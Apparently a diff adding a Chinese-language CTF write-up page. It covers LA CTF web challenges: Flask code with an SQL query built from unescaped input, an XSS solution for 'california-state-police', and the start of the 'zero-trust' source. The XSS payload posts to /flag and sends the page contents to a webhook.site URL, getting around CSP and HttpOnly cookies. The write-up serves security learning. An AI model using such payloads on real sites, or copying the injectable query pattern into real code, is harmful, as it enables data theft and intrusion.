+        <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;&lt;Image </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="si">}</span><span class="s1">&gt;&#39;</span>
+
+</pre></div>
+</div>
+<p><strong>utils.py</strong></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="kn">from</span> <span class="nn">app.models</span> <span class="kn">import</span> <span class="n">Image</span>
+
+<span class="c1"># def escape(b_string):</span>
+<span class="c1">#     re.sub()</span>
+<span class="c1">#     pass</span>
+
+<span class="k">def</span> <span class="nf">serialize_image</span><span class="p">(</span><span class="n">pp</span><span class="p">):</span>
+    <span class="n">b85</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">a85encode</span><span class="p">(</span><span class="n">pp</span><span class="p">)</span>
+    <span class="n">b85_string</span> <span class="o">=</span> <span class="n">b85</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
+
+    <span class="c1"># identify single quotes, and then escape them</span>
+    <span class="n">b85_string</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\\\\\\\\\\\\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;~&#39;</span><span class="p">,</span> <span class="n">b85_string</span><span class="p">)</span>
+    <span class="n">b85_string</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\&#39;\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">b85_string</span><span class="p">)</span>
+    <span class="n">b85_string</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">b85_string</span><span class="p">)</span>
+
+    <span class="n">b85_string</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">:&#39;</span><span class="p">,</span> <span class="s1">&#39;~&#39;</span><span class="p">,</span> <span class="n">b85_string</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">b85_string</span>
+
+<span class="k">def</span> <span class="nf">deserialize_image</span><span class="p">(</span><span class="n">b85</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">b85</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">b85</span><span class="p">)</span>
+    <span class="n">raw_image</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">a85decode</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+    <span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">encodebytes</span><span class="p">(</span><span class="n">raw_image</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">&#39;data:image/png;base64, &#39;</span> <span class="o">+</span> <span class="n">b64</span>
+
+<span class="k">def</span> <span class="nf">deserialize_images</span><span class="p">(</span><span class="n">post</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">post</span><span class="o">.</span><span class="n">images</span><span class="p">)):</span>
+        <span class="c1"># It&#39;s no longer b85 but oh well</span>
+        <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">deserialize_image</span><span class="p">(</span><span class="n">post</span><span class="o">.</span><span class="n">images</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">b85_image</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">ret</span>
+</pre></div>
+</div>
+<p><strong>views.py</strong></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">jsonify</span>
+<span class="kn">from</span> <span class="nn">flask_limiter</span> <span class="kn">import</span> <span class="n">Limiter</span>
+<span class="kn">from</span> <span class="nn">flask_limiter.util</span> <span class="kn">import</span> <span class="n">get_remote_address</span>
+
+<span class="kn">from</span> <span class="nn">sqlalchemy</span> <span class="kn">import</span> <span class="n">or_</span><span class="p">,</span> <span class="n">text</span>
+
+<span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">app</span><span class="p">,</span> <span class="n">db</span>
+<span class="kn">from</span> <span class="nn">.models</span> <span class="kn">import</span> <span class="n">Post</span><span class="p">,</span> <span class="n">Image</span>
+<span class="kn">from</span> <span class="nn">.utils</span> <span class="kn">import</span> <span class="n">serialize_image</span><span class="p">,</span> <span class="n">deserialize_images</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">MAX_IMAGE_SIZE</span> <span class="o">=</span> <span class="mi">1000000</span>
+
+<span class="n">limiter</span> <span class="o">=</span> <span class="n">Limiter</span> <span class="p">(</span>
+    <span class="n">get_remote_address</span><span class="p">,</span>
+    <span class="n">app</span><span class="o">=</span><span class="n">app</span><span class="p">,</span>
+    <span class="n">default_limits</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;360 per hour&quot;</span><span class="p">],</span>
+    <span class="n">storage_uri</span><span class="o">=</span><span class="s2">&quot;memory://&quot;</span><span class="p">,</span>
+<span class="p">)</span>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+    <span class="n">posts</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">Post</span><span class="p">)</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">Post</span><span class="o">.</span><span class="n">active</span> <span class="o">==</span> <span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;home.html&#39;</span><span class="p">,</span> <span class="n">posts</span><span class="o">=</span><span class="n">posts</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/about/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;about.html&#39;</span><span class="p">)</span>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/posts&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">post</span><span class="p">():</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">Post</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s1">&#39;post_id&#39;</span><span class="p">])</span>
+    <span class="k">if</span> <span class="n">p</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;invalid post&#39;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
+
+    <span class="n">images</span> <span class="o">=</span> <span class="n">deserialize_images</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;post.html&#39;</span><span class="p">,</span> <span class="n">post</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">images</span><span class="o">=</span><span class="n">images</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">search</span><span class="p">():</span>
+    <span class="k">if</span> <span class="s1">&#39;search-query&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;search.html&#39;</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="p">[])</span>
+
+    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s1">&#39;search-query&#39;</span><span class="p">]</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">Post</span><span class="p">)</span>\
+        <span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">or_</span><span class="p">(</span><span class="n">Post</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">contains</span><span class="p">(</span><span class="n">query</span><span class="p">),</span> <span class="n">Post</span><span class="o">.</span><span class="n">title</span><span class="o">.</span><span class="n">contains</span><span class="p">(</span><span class="n">query</span><span class="p">)))</span>\
+        <span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">Post</span><span class="o">.</span><span class="n">active</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;search.html&#39;</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/image-search&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">image_search</span><span class="p">():</span>
+    <span class="k">if</span> <span class="s1">&#39;image-query&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span> <span class="ow">or</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;image-search.html&#39;</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="p">[])</span>
+
+    <span class="n">incoming_file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;image-query&#39;</span><span class="p">]</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">fstat</span><span class="p">(</span><span class="n">incoming_file</span><span class="o">.</span><span class="n">fileno</span><span class="p">())</span><span class="o">.</span><span class="n">st_size</span>
+    <span class="k">if</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="n">MAX_IMAGE_SIZE</span><span class="p">:</span>
+        <span class="n">flash</span><span class="p">(</span><span class="s2">&quot;image is too large (50kb max)&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
+
+    <span class="n">spic</span> <span class="o">=</span> <span class="n">serialize_image</span><span class="p">(</span><span class="n">incoming_file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">connection</span><span class="p">()</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>\
+            <span class="n">text</span><span class="p">(</span><span class="s2">&quot;select parent as PID from images where b85_image = &#39;</span><span class="si">{}</span><span class="s2">&#39; AND ((select active from posts where id=PID) = TRUE)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">spic</span><span class="p">)))</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="s2">&quot;SQL error encountered&quot;</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
+
+    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">post</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">Post</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">post</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">results</span><span class="p">):</span>
+            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">post</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;image-search.html&#39;</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Custom 404 page.&quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;404.html&#39;</span><span class="p">),</span> <span class="mi">404</span>
+
+</pre></div>
+</div>
+<p><strong>题目分析</strong></p>
+<p>代码有点多，要耐心一点去看。</p>
+<p><a class="reference external" href="http://www.pythondoc.com/flask-sqlalchemy/quickstart.html#id3">flask-SQlAlchemy 文档</a></p>
+<p><a class="reference external" href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017803857459008">廖雪峰</a></p>
+</section>
+<section id="california-state-police">
+<h3>california-state-police<a class="headerlink" href="#california-state-police" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>Stop! You’re under arrest for making suggestive 3 letter acronyms!</p>
+<p>california-state-police.lac.tf</p>
+<p>Admin Bot (note: the adminpw cookie is HttpOnly and SameSite=Lax)</p>
+<p><strong>题目分析</strong></p>
+<p><img alt="" src="https://i.imgur.com/CLqzwwW.png" /></p>
+<p>cookie 中传入 adminpw 参数，值正确就可以获取 flag。</p>
+<p><img alt="" src="https://i.imgur.com/M3KwYUV.png" /></p>
+<p>上图未经任何过滤就把 id 参数对应的值回显到页面上，存在 XSS 漏洞。</p>
+<p>但注意一下题目的 <a class="reference external" href="https://www.cnblogs.com/mutudou/p/14373644.html">CSP</a> 策略</p>
+<p><img alt="" src="https://i.imgur.com/Jb7anMv.png" /></p>
+<p>默认是不允许加载任何来源的任意资源，但是可以执行内联的 JS 脚本。</p>
+<p>如果没有这个 CSP 限制，那常规的操作肯定是让管理员访问 /flag 然后拿到网页的响应，之后向我们的 vps 发送一个携带 cookie 的请求。但是题目描述中已经明确地告诉我们管理员的 cookie 是 <a class="reference external" href="https://zhuanlan.zhihu.com/p/36197012">HttpOnly</a> 的，这意味着在前端无法通过 JS 拿到 Cookie。</p>
+<p>现在该怎么办？虽然可以执行内联的JS代码，但是不能直接获取cookie，并且不能加载其他任何域的资源。</p>
+<p>不妨先看看题目描述的提示 <a class="reference external" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite">SameSite=Lax</a> 意味着什么（中英结合）：</p>
+<p><img alt="" src="https://i.imgur.com/E527Fyy.png" /></p>
+<p>上图告诉我们 Set-Cookie HTTP 响应标头的 SameSite 属性允许您声明您的 cookie 是否应限制在第一方或同一站点上下文中。</p>
+<p>SameSite 属性接受三个值，这里说说第一个 <code class="docutils literal notranslate"><span class="pre">Lax</span></code> 是什么: Cookie 不会在正常的跨站点子请求（例如将图像或框架加载到第三方站点）上发送，而是在用户导航到原始站点时发送（即，在点击链接时）。</p>
+<p>如果在最近的浏览器版本中未明确指定 SameSite，则这是默认的 cookie 值（请参阅浏览器兼容性中的“SameSite：默认为 Lax”功能）。</p>
+<p><img alt="" src="https://i.imgur.com/UNIDZAO.png" /></p>
+<p>感觉中文的更易于理解，它说我们可以通过顶级导航来发送 Cookie。</p>
+<blockquote>
+<div><p>什么是顶级导航？在这篇文章：https://juejin.cn/post/7011005750143090695</p>
+</div></blockquote>
+<blockquote>
+<div><p>如果对以上所说一知半解，推荐看看这篇：https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html</p>
+</div></blockquote>
+<p>WP 的思路很简单，就是通过顶级导航转到存在 XSS 漏洞的页面并执行我们构造的 JS 代码（发送含有 flag 的页面内容给我们）</p>
+<blockquote>
+<div><p>注意由于 default-src ‘none’ 使得我们不可直接访问 /flag，只能通过顶级导航。<img alt="" src="https://i.imgur.com/xD1qhWt.png" /></p>
+</div></blockquote>
+<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span>&lt;form method=&quot;post&quot; id=&quot;theForm&quot; action=&quot;/flag&quot; target=&#39;bruh&#39;&gt;
+    &lt;!-- target 表示提交表单后在哪里显示响应信息 --&gt;
+    &lt;!-- Form body here --&gt;
+&lt;/form&gt;
+
+&lt;script&gt; 
+    let w = window.open(&#39;&#39;,&#39;bruh&#39;);
+    document.getElementById(&#39;theForm&#39;).submit();
+    setTimeout(()=&gt;{
+        document.location= `https://webhook.site/bdec584e-7d0e-41af-9dec-84eec09374e5?c=${w.document.body.innerHTML}`
+    },500);
+&lt;/script&gt;
+</pre></div>
+</div>
+<blockquote>
+<div><p>document.body.innerHTML 用于得到一个文档的 html 内容</p>
+</div></blockquote>
+</section>
+<section id="zero-trust">
+<h3>zero-trust<a class="headerlink" href="#zero-trust" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>I was researching zero trust proofs in cryptography and now I have zero trust in JWT libraries so I rolled my own! That’s what zero trust means, right?</p>
+<p>zero-trust.lac.tf</p>
+<p>Note: the flag is in /flag.txt</p>
+<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">const</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;express&quot;</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;path&quot;</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;fs&quot;</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">cookieParser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;cookie-parser&quot;</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">crypto</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;crypto&quot;</span><span class="p">);</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="mf">8080</span><span class="p">;</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mf">32</span><span class="p">);</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">();</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">lists</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Map</span><span class="p">();</span>
+
+<span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readdirSync</span><span class="p">(</span><span class="s2">&quot;/tmp/pastestore&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">statSync</span><span class="p">(</span><span class="s2">&quot;/tmp/pastestore/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">file</span><span class="p">).</span><span class="nx">mtimeMs</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">fs</span><span class="p">.</span><span class="nx">rmSync</span><span class="p">(</span><span class="s2">&quot;/tmp/pastestore/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">file</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">},</span><span class="w"> </span><span class="mf">60000</span><span class="p">);</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">makeAuth</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">iv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mf">16</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">tmpfile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;/tmp/pastestore/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mf">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s2">&quot;hex&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="nx">tmpfile</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;there&#39;s no paste data yet!&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;utf8&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">tmpfile</span><span class="w"> </span><span class="p">};</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">createCipheriv</span><span class="p">(</span><span class="s2">&quot;aes-256-gcm&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">iv</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">cipher</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span><span class="w"> </span><span class="nx">cipher</span><span class="p">.</span><span class="kr">final</span><span class="p">()]);</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">authTag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cipher</span><span class="p">.</span><span class="nx">getAuthTag</span><span class="p">();</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s2">&quot;auth&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">iv</span><span class="p">,</span><span class="w"> </span><span class="nx">authTag</span><span class="p">,</span><span class="w"> </span><span class="nx">ct</span><span class="p">].</span><span class="nx">map</span><span class="p">((</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s2">&quot;base64&quot;</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">));</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">user</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">next</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">needsAuth</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">auth</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">auth</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s2">&quot;string&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">makeAuth</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">iv</span><span class="p">,</span><span class="w"> </span><span class="nx">authTag</span><span class="p">,</span><span class="w"> </span><span class="nx">ct</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">auth</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">).</span><span class="nx">map</span><span class="p">((</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;base64&quot;</span><span class="p">));</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">createDecipheriv</span><span class="p">(</span><span class="s2">&quot;aes-256-gcm&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">iv</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">cipher</span><span class="p">.</span><span class="nx">setAuthTag</span><span class="p">(</span><span class="nx">authTag</span><span class="p">);</span>
